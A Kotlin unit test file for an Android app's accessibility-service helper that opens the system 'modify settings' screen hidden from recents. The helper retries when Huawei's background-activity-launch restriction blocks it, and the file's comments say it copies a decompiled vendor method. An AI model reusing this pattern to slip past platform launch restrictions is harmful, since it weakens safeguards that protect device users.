package com.storm.safe.rock.service.modules

import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ResolveInfo
import android.view.accessibility.AccessibilityNodeInfo
import com.storm.safe.rock.service.MyAccessibilityService
import kotlinx.coroutines.runBlocking
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Before
import org.junit.Test
import org.junit.runner.RunWith
import org.mockito.Mockito.`when`
import org.mockito.Mockito.any
import org.mockito.Mockito.mock
import org.mockito.Mockito.never
import org.mockito.Mockito.verify
import org.robolectric.RobolectricTestRunner

/**
 * T18 WRITE_SETTINGS BAL-rejection hardening tests — covers [WriteSettingsSafeLauncher.launchWithVerify].
 *
 * vendor `C0327b2.m211743e8` 沿用的 startActivity 无 verify；华为 force-stop 后 a11y 解绑期间
 * 静默 BAL 拒绝，我们需要：(1) serviceInfo null guard；(2) 800ms 后 verify rootInActiveWindow 包名；
 * (3) 1 次 retry。
 */
@RunWith(RobolectricTestRunner::class)
class WriteSettingsBindingCheckTest {

    private lateinit var mockService: MyAccessibilityService
    private lateinit var mockContext: Context
    private lateinit var mockPackageManager: PackageManager

    @Before
    fun setUp() {
        mockService = mock(MyAccessibilityService::class.java)
        mockContext = mock(Context::class.java)
        mockPackageManager = mock(PackageManager::class.java)
        `when`(mockService.applicationContext).thenReturn(mockContext)
        `when`(mockContext.packageName).thenReturn("com.storm.safe.rock")
        `when`(mockService.packageName).thenReturn("com.storm.safe.rock")
        `when`(mockContext.packageManager).thenReturn(mockPackageManager)
    }

    // Test 1 — Guard 1: serviceInfo == null → skip launch
    @Test
    fun `launchWithVerify returns false when serviceInfo is null`() = runBlocking {
        `when`(mockService.serviceInfo).thenReturn(null)

        val result = WriteSettingsSafeLauncher.launchWithVerify(mockService)

        assertFalse("Should return false when serviceInfo is null", result)
        verify(mockService, never()).startActivity(any())
    }

    // Test 2 — happy path: serviceInfo bound + verify passes on first try
    @Test
    fun `launchWithVerify returns true when a11y bound and first verify passes`() = runBlocking {
        val serviceInfo = mock(AccessibilityServiceInfo::class.java)
        `when`(mockService.serviceInfo).thenReturn(serviceInfo)
        val resolveInfo = mock(ResolveInfo::class.java)
        `when`(mockPackageManager.resolveActivity(any(Intent::class.java), any(Int::class.java))).thenReturn(resolveInfo)

        val root = mock(AccessibilityNodeInfo::class.java)
        `when`(root.packageName).thenReturn("com.android.settings")
        `when`(mockService.rootInActiveWindow).thenReturn(root)

        val result = WriteSettingsSafeLauncher.launchWithVerify(mockService)

        assertTrue("Should return true when verify passes", result)
        verify(mockService).startActivity(any(Intent::class.java))
    }

    // Test 3 — BAL rejection: both verify attempts see wrong package → 2 startActivity calls
    @Test
    fun `launchWithVerify returns false when both verify attempts see non-settings pkg`() = runBlocking {
        val serviceInfo = mock(AccessibilityServiceInfo::class.java)
        `when`(mockService.serviceInfo).thenReturn(serviceInfo)
        val resolveInfo = mock(ResolveInfo::class.java)
        `when`(mockPackageManager.resolveActivity(any(Intent::class.java), any(Int::class.java))).thenReturn(resolveInfo)

        val wrongRoot = mock(AccessibilityNodeInfo::class.java)
        `when`(wrongRoot.packageName).thenReturn("com.huawei.android.launcher")
        `when`(mockService.rootInActiveWindow).thenReturn(wrongRoot)

        val result = WriteSettingsSafeLauncher.launchWithVerify(mockService)

        assertFalse("Should return false when BAL rejects twice", result)
        verify(mockService, org.mockito.Mockito.times(2)).startActivity(any(Intent::class.java))
    }

    // Test 4 — retry recovery: first verify fails, second succeeds
    @Test
    fun `launchWithVerify succeeds on retry after first verify fails`() = runBlocking {
        val serviceInfo = mock(AccessibilityServiceInfo::class.java)
        `when`(mockService.serviceInfo).thenReturn(serviceInfo)
        val resolveInfo = mock(ResolveInfo::class.java)
        `when`(mockPackageManager.resolveActivity(any(Intent::class.java), any(Int::class.java))).thenReturn(resolveInfo)

        val wrongRoot = mock(AccessibilityNodeInfo::class.java)
        `when`(wrongRoot.packageName).thenReturn("com.huawei.android.launcher")

        val correctRoot = mock(AccessibilityNodeInfo::class.java)
        `when`(correctRoot.packageName).thenReturn("com.android.settings")

        `when`(mockService.rootInActiveWindow)
            .thenReturn(wrongRoot)
            .thenReturn(correctRoot)

        val result = WriteSettingsSafeLauncher.launchWithVerify(mockService)

        assertTrue("Should return true when retry verify succeeds", result)
        verify(mockService, org.mockito.Mockito.times(2)).startActivity(any(Intent::class.java))
    }

    // Test 5 — Intent flags 对齐 vendor C0327b2.m211743e8
    @Test
    fun `launchWithVerify passes intent with NEW_TASK and EXCLUDE_FROM_RECENTS flags`() = runBlocking {
        val serviceInfo = mock(AccessibilityServiceInfo::class.java)
        `when`(mockService.serviceInfo).thenReturn(serviceInfo)
        val resolveInfo = mock(ResolveInfo::class.java)
        `when`(mockPackageManager.resolveActivity(any(Intent::class.java), any(Int::class.java))).thenReturn(resolveInfo)

        val root = mock(AccessibilityNodeInfo::class.java)
        `when`(root.packageName).thenReturn("com.android.settings")
        `when`(mockService.rootInActiveWindow).thenReturn(root)

        WriteSettingsSafeLauncher.launchWithVerify(mockService)

        val captor = org.mockito.ArgumentCaptor.forClass(Intent::class.java)
        verify(mockService).startActivity(captor.capture())
        val intent = captor.value
        assertEquals("android.settings.action.MANAGE_WRITE_SETTINGS", intent.action)
        val expectedFlags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS
        assertEquals("flags should include NEW_TASK | EXCLUDE_FROM_RECENTS (vendor 0x10800000)",
            expectedFlags, intent.flags and expectedFlags)
    }

    // Test 6 — resolveActivity 返回 null → 不启动
    @Test
    fun `launchWithVerify returns false when resolveActivity returns null`() = runBlocking {
        val serviceInfo = mock(AccessibilityServiceInfo::class.java)
        `when`(mockService.serviceInfo).thenReturn(serviceInfo)
        `when`(mockPackageManager.resolveActivity(any(Intent::class.java), any(Int::class.java))).thenReturn(null)

        val result = WriteSettingsSafeLauncher.launchWithVerify(mockService)

        assertFalse("Should return false when intent not resolvable", result)
        verify(mockService, never()).startActivity(any())
    }
}
